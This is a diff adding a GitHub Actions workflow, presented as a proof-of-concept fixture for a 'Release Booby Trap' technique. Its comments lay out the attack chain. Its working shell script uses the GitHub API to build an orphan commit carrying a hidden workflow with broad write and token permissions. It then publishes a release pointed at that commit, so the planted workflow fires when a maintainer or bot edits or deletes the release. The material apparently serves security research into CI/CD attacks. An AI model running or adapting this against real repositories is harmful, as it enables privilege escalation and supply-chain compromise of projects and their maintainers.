@@ -1,0 +1,80 @@
+# Malicious planter workflow — demonstrates the Release Booby Trap technique.
+#
+# Canonical reference: https://github.com/Dev11940518/release-bomb-demo
+# License: Apache-2.0 (same as gato-x)
+#
+# This is a PoC fixture — do NOT deploy to a real repository.
+#
+# ## Attack chain
+#
+# 1. This workflow runs (via workflow_dispatch) with GITHUB_TOKEN and
+#    contents: write.
+# 2. It creates a draft release with target_commitish=main (clean),
+#    then PATCHes target_commitish to an orphan SHA and publishes.
+# 3. The orphan SHA contains a planted workflow (see bomb.yml) that
+#    triggers on `release: [edited, deleted]`.
+# 4. When a human maintainer or bot interacts with the release
+#    (rename, delete, upload asset, etc.), the planted workflow fires,
+#    bypassing loop prevention because the actor is not GITHUB_TOKEN.
+
+name: planter
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  plant:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Plant Orphan Commit + PATCH-publish via GITHUB_TOKEN
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          RAND=$(openssl rand -hex 4)
+
+          # ---- Build the orphan commit via Git Data API ----
+          MAIN_SHA=$(gh api /repos/$REPO/git/refs/heads/main --jq '.object.sha')
+          MAIN_TREE=$(gh api /repos/$REPO/git/commits/$MAIN_SHA --jq '.tree.sha')
+          DOTGH=$(gh api /repos/$REPO/git/trees/$MAIN_TREE --jq '.tree[]|select(.path==".github").sha')
+          WFTREE=$(gh api /repos/$REPO/git/trees/$DOTGH --jq '.tree[]|select(.path=="workflows").sha')
+
+          YAML='
+          name: Release Booby Trap
+          on: {release: {types: [edited, deleted]}}
+          jobs:
+            fire:
+              permissions: {id-token: write, contents: write, pull-requests: write, actions: write}
+              runs-on: ubuntu-latest
+              steps:
+                - run: echo pwned'
+
+          # Tree-splice: create blob → tree → tree → tree → commit
+          tree1(){ jq -nc --arg b "$1" --arg p "$2" --arg m "$3" --arg t "$4" --arg s "$5" '{base_tree:$b,tree:[{path:$p,mode:$m,type:$t,sha:$s}]}'; }
+          BLOB=$(jq -nc --arg c "$YAML" '{content:$c,encoding:"utf-8"}' | gh api /repos/$REPO/git/blobs --input - --jq '.sha')
+          NEWWF=$(tree1 "$WFTREE"    "bot-$RAND.yml" "100644" "blob" "$BLOB"  | gh api /repos/$REPO/git/trees --input - --jq '.sha')
+          NEWGH=$(tree1 "$DOTGH"     "workflows"     "040000" "tree" "$NEWWF" | gh api /repos/$REPO/git/trees --input - --jq '.sha')
+          NEWTOP=$(tree1 "$MAIN_TREE" ".github"      "040000" "tree" "$NEWGH" | gh api /repos/$REPO/git/trees --input - --jq '.sha')
+          SHA=$(jq -nc --arg t "$NEWTOP" --arg p "$MAIN_SHA" --arg m "bot-plant $RAND" '{tree:$t,parents:[$p],message:$m}' \
+            | gh api /repos/$REPO/git/commits --input - --jq '.sha')
+
+          TAG="bot-$RAND"
+
+          # ---- Create release, PATCH-publish ----
+          RID=$(gh api /repos/$REPO/releases \
+            -f tag_name="$TAG" \
+            -f name="Malicious Release - Delete me!" \
+            -f target_commitish=main \
+            -F draft=true \
+            --jq '.id')
+
+          # PATCH target_commitish to the orphan SHA
+          gh api --method PATCH /repos/$REPO/releases/$RID \
+            -f target_commitish="$SHA" \
+            -f draft=false
+
+          echo "PUBLISHED RID=$RID at orphan SHA=$SHA"
